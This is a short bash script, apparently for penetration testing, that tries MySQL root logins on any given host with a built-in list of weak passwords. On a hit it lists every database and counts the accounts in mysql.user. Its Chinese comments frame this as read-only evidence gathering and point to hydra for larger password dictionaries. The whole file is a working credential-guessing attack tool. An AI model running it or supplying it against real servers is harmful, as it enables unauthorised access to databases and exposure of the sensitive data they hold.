#!/usr/bin/env bash
HOST="${1:?usage: bash mysql.sh HOST [PORT]}"
PORT="${2:-3306}"
FAIL=0
for p in "" root 123456 password root123 admin mysql; do
  out=$(mysql -h "$HOST" -P "$PORT" -uroot --connect-timeout=4 ${p:+-p"$p"} -N -e 'select version()' 2>/dev/null)
  if [ -n "$out" ]; then echo "VULN root:/'$p' -> $out"; FAIL=1; HIT="$p"; break; fi
done
[ "$FAIL" = "0" ] && { echo "SAFE/未命中（换字典走 hydra：-t 2 -W 5）"; exit 1; }
# 只读取证 + 规模统计（"大量敏感信息"要实际条数）
mysql -h "$HOST" -P "$PORT" -uroot ${HIT:+-p"$HIT"} -e 'show databases;'
mysql -h "$HOST" -P "$PORT" -uroot ${HIT:+-p"$HIT"} -e 'select count(*) from mysql.user;'
